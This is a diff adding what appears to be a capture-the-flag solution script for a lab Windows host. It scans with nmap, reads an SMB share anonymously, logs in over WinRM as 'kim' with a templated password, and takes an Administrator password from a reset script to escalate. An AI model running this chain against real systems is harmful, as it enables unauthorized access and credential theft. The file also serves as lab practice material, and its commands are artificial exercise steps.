@@ -1,0 +1,17 @@
+## find the Windows host and its open ports
+nmap -sn 10.10.3.0/24
+nmap -sV 10.10.3.40
+## list and read the share with no account
+smbclient -L //10.10.3.40 -N
+smbclient //10.10.3.40/Public -N -c 'ls; get new-staff.txt'
+cat new-staff.txt
+## sign in as kim and take her flag
+winrm-shell -i 10.10.3.40 -u kim -p {{KIMPW}}
+Get-Content C:\Users\kim\Desktop\flag.txt
+Get-ChildItem C:\Users\kim\Documents
+Get-Content C:\Users\kim\Documents\reset-local-admin.ps1
+exit
+## the script held the local Administrator password; sign in as Administrator
+winrm-shell -i 10.10.3.40 -u Administrator -p {{ADMPW}}
+Get-Content C:\Users\Administrator\Desktop\flag.txt
+exit
